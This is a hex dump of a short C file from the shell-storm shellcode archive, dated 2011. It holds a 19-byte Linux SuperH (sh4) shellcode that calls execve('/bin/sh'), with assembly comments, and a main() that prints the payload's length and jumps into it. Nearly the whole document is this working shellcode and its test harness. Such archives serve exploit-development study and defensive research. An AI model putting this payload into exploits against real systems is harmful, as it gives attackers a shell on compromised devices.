00000000  2f 2a 0a 20 7c 20 54 69  74 6c 65 3a 20 20 20 20  |/*. | Title:    |
00000010  20 4c 69 6e 75 78 2f 53  75 70 65 72 48 20 2d 20  | Linux/SuperH - |
00000020  73 68 34 20 65 78 65 63  76 65 28 22 2f 62 69 6e  |sh4 execve("/bin|
00000030  2f 73 68 22 2c 20 30 2c  20 30 29 20 2d 20 31 39  |/sh", 0, 0) - 19|
00000040  20 62 79 74 65 73 0a 20  7c 20 44 61 74 65 3a 20  | bytes. | Date: |
00000050  20 20 20 20 20 32 30 31  31 2d 30 36 2d 32 32 0a  |     2011-06-22.|
00000060  20 7c 20 54 65 73 74 65  64 20 6f 6e 3a 20 44 65  | | Tested on: De|
00000070  62 69 61 6e 2d 73 68 34  20 32 2e 36 2e 33 32 2d  |bian-sh4 2.6.32-|
00000080  35 2d 73 68 37 37 35 31  72 0a 20 7c 20 41 75 74  |5-sh7751r. | Aut|
00000090  68 6f 72 3a 20 20 20 20  46 6c 6f 72 69 61 6e 20  |hor:    Florian |
000000a0  47 61 75 6c 74 69 65 72  20 2d 20 61 67 69 78 20  |Gaultier - agix |
000000b0  2d 20 74 77 69 74 74 65  72 3a 20 40 41 67 69 78  |- twitter: @Agix|
000000c0  69 64 0a 20 7c 0a 20 7c  20 68 74 74 70 3a 2f 2f  |id. |. | http://|
000000d0  73 68 65 6c 6c 2d 73 74  6f 72 6d 2e 6f 72 67 0a  |shell-storm.org.|
000000e0  2a 2f 0a 0a 23 69 6e 63  6c 75 64 65 20 3c 73 74  |*/..#include <st|
000000f0  72 69 6e 67 2e 68 3e 0a  23 69 6e 63 6c 75 64 65  |ring.h>.#include|
00000100  20 3c 73 74 64 69 6f 2e  68 3e 0a 0a 69 6e 74 20  | <stdio.h>..int |
00000110  6d 61 69 6e 28 29 7b 0a  63 68 61 72 20 73 68 65  |main(){.char she|
00000120  6c 6c 5b 5d 20 3d 0a 09  09 22 5c 78 30 62 5c 78  |ll[] =..."\x0b\x|
00000130  65 33 22 2f 2f 20 20 20  20 20 20 20 20 20 20 20  |e3"//           |
00000140  6d 6f 76 20 20 20 20 20  23 31 31 2c 72 33 0a 09  |mov     #11,r3..|
00000150  09 22 5c 78 30 32 5c 78  63 37 22 2f 2f 20 20 20  |."\x02\xc7"//   |
00000160  20 20 20 20 20 20 20 20  6d 6f 76 61 20 20 20 20  |        mova    |
00000170  40 28 31 30 2c 70 63 29  2c 72 30 0a 09 09 22 5c  |@(10,pc),r0..."\|
00000180  78 30 33 5c 78 36 34 22  2f 2f 20 20 20 20 20 20  |x03\x64"//      |
00000190  20 20 20 20 20 6d 6f 76  20 20 20 20 20 72 30 2c  |     mov     r0,|
000001a0  72 34 0a 09 09 22 5c 78  35 61 5c 78 32 35 22 2f  |r4..."\x5a\x25"/|
000001b0  2f 20 20 20 20 20 20 20  20 20 20 20 78 6f 72 20  |/           xor |
000001c0  20 20 20 20 72 35 2c 72  35 0a 09 09 22 5c 78 36  |    r5,r5..."\x6|
000001d0  61 5c 78 32 36 22 2f 2f  20 20 20 20 20 20 20 20  |a\x26"//        |
000001e0  20 20 20 78 6f 72 20 20  20 20 20 72 36 2c 72 36  |   xor     r6,r6|
000001f0  0a 09 09 22 5c 78 30 32  5c 78 63 33 22 2f 2f 20  |..."\x02\xc3"// |
00000200  20 20 20 20 20 20 20 20  20 20 74 72 61 70 61 20  |          trapa |
00000210  20 20 23 32 0a 09 09 22  2f 62 69 6e 2f 73 68 22  |  #2..."/bin/sh"|
00000220  3b 0a 0a 70 72 69 6e 74  66 28 22 5b 2a 5d 20 54  |;..printf("[*] T|
00000230  61 69 6c 6c 65 20 64 75  20 53 68 65 6c 6c 43 6f  |aille du ShellCo|
00000240  64 65 20 3d 20 25 64 5c  6e 22 2c 20 73 74 72 6c  |de = %d\n", strl|
00000250  65 6e 28 73 68 65 6c 6c  29 29 3b 0a 28 2a 28 76  |en(shell));.(*(v|
00000260  6f 69 64 20 28 2a 29 28  29 29 20 73 68 65 6c 6c  |oid (*)()) shell|
00000270  29 28 29 3b 0a 0a 72 65  74 75 72 6e 20 30 3b 0a  |)();..return 0;.|
00000280  7d                                                |}|
00000281
